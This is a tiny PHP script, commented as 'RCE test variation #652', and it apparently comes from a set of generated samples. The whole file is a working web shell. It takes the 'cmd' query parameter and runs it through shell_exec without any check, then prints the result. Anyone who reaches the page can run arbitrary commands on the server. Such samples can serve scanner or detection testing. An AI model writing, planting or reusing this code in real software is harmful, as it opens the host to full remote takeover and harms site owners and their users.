<?php
// RCE test variation #652
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>